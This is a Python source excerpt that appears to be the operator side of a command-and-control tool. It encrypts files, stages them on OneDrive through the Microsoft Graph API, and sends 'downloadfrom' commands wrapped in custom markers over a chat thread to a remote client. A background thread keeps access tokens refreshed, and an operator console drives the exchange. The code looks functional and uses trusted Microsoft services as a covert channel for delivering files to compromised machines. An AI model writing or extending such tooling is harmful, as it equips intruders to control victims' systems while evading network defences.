...
def refresh_all_tokens(tokens: dict, debug: bool = False, timeout: int = None) -> None:
...
def upload_to_onedrive(local_path: str, remote_name: str, tokens: dict, debug: bool = False) -> str:
    """
    Encrypts the file and uploads it directly to OneDrive via Graph API.
    Returns the unauthenticated @microsoft.graph.downloadUrl.
    """
    session = tokens["session"]
    graph_token = tokens.get("graph_token", "")
    if not graph_token:
        raise RuntimeError("No graph_token available for OneDrive upload.")
    ...
    # We use /me/drive/root:/<path>:/content for files up to 4MB.
    # For larger files, we use createUploadSession.
    
    remote_path = f"uploads/{file_name}"
    
    if file_size <= 4 * 1024 * 1024:
        # Simple upload for small files
        upload_url = f"https://graph.microsoft.com/v1.0/me/drive/root:/{urllib.parse.quote(remote_path)}:/content"
        r_up = _api_call(session, "PUT", upload_url, tokens, debug=debug,
                         headers={
                             "Authorization": f"Bearer {graph_token}",
        ...
        if r_up.status_code not in (200, 201):
            raise RuntimeError(f"OneDrive simple upload failed ({r_up.status_code}): {r_up.text[:300]}")
        item_data = r_up.json()
    else:
        # Resumable upload for large files
        create_session_url = f"https://graph.microsoft.com/v1.0/me/drive/root:/{urllib.parse.quote(remote_path)}:/createUploadSession"
        r_session = _api_call(session, "POST", create_session_url, tokens, debug=debug,
                              headers={
                                  "Authorization": f"Bearer {graph_token}",
                                  "Content-Type": "application/json"
                              },
        ...
        if r_session.status_code != 200:
            raise RuntimeError(f"Failed to create upload session ({r_session.status_code}): {r_session.text[:300]}")
            
        upload_url = r_session.json().get("uploadUrl")
        if not upload_url:
        ...
        for i in range(0, file_size, chunk_size):
            ...
            end_byte = i + len(chunk) - 1
            chunk_num = i // chunk_size + 1
            
            headers = {
                "Content-Length": str(len(chunk)),
                "Content-Range": f"bytes {i}-{end_byte}/{file_size}"
            }
            
            r_chunk = session.put(upload_url, headers=headers, data=chunk, timeout=120)
            print(f"[*] Chunk {chunk_num}/{total_chunks}: HTTP {r_chunk.status_code}")
            if r_chunk.status_code in (200, 201):
                # Final chunk — server returns the item JSON
                item_data = r_chunk.json()
            elif r_chunk.status_code == 202:
                # Intermediate chunk — continue
                continue
            else:
                raise RuntimeError(f"Chunk upload failed ({r_chunk.status_code}): {r_chunk.text[:300]}")
                
        if not item_data:
            raise RuntimeError("Upload completed but no item data returned")

    # Extract the download URL.
    # @microsoft.graph.downloadUrl is a pre-authenticated short-lived URL.
    # It is always present for personal OneDrive items.
    download_url = item_data.get("@microsoft.graph.downloadUrl")
    if not download_url:
        # Fallback: request the item with the downloadUrl field explicitly
        item_id = item_data.get("id", "")
        if not item_id:
            # Try to get item by path
            r_item = _api_call(session, "GET",
                               f"https://graph.microsoft.com/v1.0/me/drive/root:/{urllib.parse.quote(remote_path)}",
                               tokens, debug=debug,
                               headers={"Authorization": f"Bearer {graph_token}"})
            if r_item.status_code == 200:
                item_id = r_item.json().get("id", "")
                download_url = r_item.json().get("@microsoft.graph.downloadUrl", "")
        if item_id and not download_url:
            r_get = _api_call(session, "GET",
                              f"https://graph.microsoft.com/v1.0/me/drive/items/{item_id}",
                              tokens, debug=debug,
                              headers={"Authorization": f"Bearer {graph_token}"})
            if r_get.status_code == 200:
                download_url = r_get.json().get("@microsoft.graph.downloadUrl", "")
            
    if not download_url:
        raise RuntimeError("Failed to obtain download URL from OneDrive")
        
    print(f"[+] OneDrive upload OK — download URL ready.")
    return download_url
...
def token_rotation_loop(tokens: dict, thread_id: str,
    ...
    while True:
        ...
        try:
            # Use a timeout so a slow/unresponsive login.microsoftonline.com
            # does not hang the rotation thread indefinitely.
            refresh_all_tokens(tokens, debug=debug, timeout=30)
            ...
            # Catch network errors (ReadTimeout, ConnectionError, etc.) so the
            # thread does not crash — it will retry on the next interval.
            print(f"\n[!] Token rotation: network error: {type(e).__name__}: {e}")
            print("CLI >", end="", flush=True)
            continue
        if server_tokens is None:
            _dbg("[rotation] Server tokens refreshed in memory.", debug)
            continue
    ...
    while True:
        ...
        if parts[0].lower() == "upload":
            ...
            try:
                ...
                # NEW LOGIC: Upload to OneDrive Graph API and send URL
                file_size_kb = len(raw_data) / 1024
                dest_info = f" → {dest_path}" if dest_path else ""
                print(f"[*] Preparing '{remote_name}' ({file_size_kb:.1f} KB){dest_info} via OneDrive Graph API...")

                download_url = upload_to_onedrive(local_path, remote_name, tokens, debug)
                
                # Format: ##CMD##downloadfrom remote_name dest_path url##END##
                # The client will parse this, download from the direct URL, and decrypt.
                cmd_payload = f"downloadfrom {remote_name} {dest_path} {download_url}"
                cmd_msg = f"{CMD_START}{cmd_payload}{CMD_END}"
                
                sent_at_epoch = int(time.time() * 1000)
                send_raw(thread_id, cmd_msg, tokens, debug)
                print(f"[*] Sent direct download URL to Client. Waiting for acknowledgement...")
...
def main():
    ...
    try:
        ...
        server_rot_thread = threading.Thread(
            target=token_rotation_loop,
            args=(server_tokens, thread_id, None, args.debug),
            daemon=True,
            name="TokenRotation_Server",
        )
        server_rot_thread.start()
        print(f"[*] Server token rotation started (every {TOKEN_ROTATION_INTERVAL}s)")
